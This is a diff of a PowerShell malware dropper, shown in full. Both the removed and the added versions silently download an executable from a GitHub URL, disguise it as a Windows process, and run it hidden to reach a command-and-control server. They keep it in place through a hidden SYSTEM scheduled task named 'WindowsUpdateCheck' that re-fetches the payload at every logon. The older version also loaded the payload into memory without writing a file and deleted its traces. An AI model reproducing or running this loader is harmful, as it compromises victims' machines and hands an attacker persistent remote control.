@@ -1,81 +1,43 @@
 # ==========================================
-# SILENT FINAL DEPLOY (Same Logic - No Output)
+# PRODUCTION DEPLOY (Waits for C2 + Stable)
 # ==========================================
 
-# SUPPRESS ALL OUTPUT
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference='SilentlyContinue';$InformationPreference='SilentlyContinue'
 
-# --- CONFIGURATION ---
-$PayloadUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
-$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
-$LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
-$TaskName   = "WindowsUpdateCheck"
+# CONFIG
+$PayloadUrl='https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
+$TaskName='WindowsUpdateCheck'
 
-# --- 1. CLEANUP (Remove Old Traces) ---
-Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
-Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
-Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
+# CLEANUP
+schtasks /delete /tn $TaskName /f 2>$null
+Remove-Item "$env:APPDATA\Microsoft\Windows\Templates\*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\syshost.exe" -Force -ErrorAction SilentlyContinue
 
-# --- 2. EXECUTION (Same Logic - Silent) ---
-function Run-Payload {
-    try {
-        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
-    } catch { return }
+# IMMEDIATE EXECUTE (EXE + WAIT)
+$wc=New-Object Net.WebClient
+$bytes=$wc.DownloadData($PayloadUrl)
+$payloadPath="$env:TEMP\syshost.exe"
+[IO.File]::WriteAllBytes($payloadPath,$bytes)
 
-    # Attempt 1: Load directly into RAM (Fileless)
-    try {
-        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
-        $assembly.EntryPoint.Invoke($null, $null)
-        return
-    } catch {}
+# START EXE + WAIT 10 SECONDS FOR C2
+$proc=Start-Process $payloadPath -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 10
 
-    # Attempt 2: Drop to Disk (Hidden) and Run
-    try {
-        $path = "$env:APPDATA\Microsoft\Windows\Templates\WmiPrvSE.exe"
-        [IO.File]::WriteAllBytes($path, $bytes)
-        Start-Process $path -WindowStyle Hidden
-    } catch {}
-}
+# PERSISTENCE (Logon Trigger)
+$service=New-Object -ComObject Schedule.Service
+$service.Connect()
+$rootFolder=$service.GetFolder("\")
+try{$rootFolder.DeleteTask($TaskName,0)}catch{}
+$taskDef=$service.NewTask(0)
+$taskDef.Settings.Enabled=$true
+$taskDef.Settings.Hidden=$true
+$taskDef.Settings.ExecutionTimeLimit="PT5M"
+$trigger=$taskDef.Triggers.Create(9)
+$trigger.Enabled=$true
+$action=$taskDef.Actions.Create(0)
+$action.Path="powershell.exe"
+$action.Arguments="-WindowStyle Hidden -Command `"`$b=(New-Object Net.WebClient).DownloadData('$PayloadUrl');`$p=`"$env:TEMP\syshost.exe`";[IO.File]::WriteAllBytes(`$p,`$b);Start-Process `$p -WindowStyle Hidden;Start-Sleep 10`""
+$rootFolder.RegisterTaskDefinition($TaskName,$taskDef,6,"SYSTEM",$null,4)|Out-Null
 
-# --- 3. PERSISTENCE (Same Logic - Silent) ---
-try {
-    # A. Download the C++ Loader
-    try {
-        $wc = New-Object Net.WebClient
-        $wc.DownloadFile($LoaderUrl, $LoaderPath)
-    } catch {}
-
-    # B. Register Task via COM Object
-    $service = New-Object -ComObject Schedule.Service
-    $service.Connect()
-    $rootFolder = $service.GetFolder("\")
-    
-    # Delete old task first
-    try { $rootFolder.DeleteTask($TaskName, 0) } catch {}
-    
-    # Define Task (EXACT SAME)
-    $taskDef = $service.NewTask(0)
-    $taskDef.RegistrationInfo.Description = "System Integrity Check"
-    $taskDef.Settings.Enabled = $true
-    $taskDef.Settings.Hidden = $true
-    $taskDef.Settings.MultipleInstances = 2
-    $taskDef.Settings.DisallowStartIfOnBatteries = $false
-    $taskDef.Settings.StopIfGoingOnBatteries = $false
-    
-    # Create Trigger (Logon + 15 Min Infinite Loop)
-    $trigger = $taskDef.Triggers.Create(9)
-    $trigger.Id = "LogonTrigger"
-    $trigger.Enabled = $true
-    $trigger.Repetition.Interval = "PT15M"
-    
-    # Create Action
-    $action = $taskDef.Actions.Create(0)
-    $action.Path = $LoaderPath
-    
-    # Register Task (FIXED: SYSTEM user)
-    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "SYSTEM", $null, 4) | Out-Null
-    
-} catch {}
-
-# --- 4. START ---
-Run-Payload
+# KEEP POWERSHELL ALIVE 30s (C2 handshake)
+Start-Sleep -Seconds 30
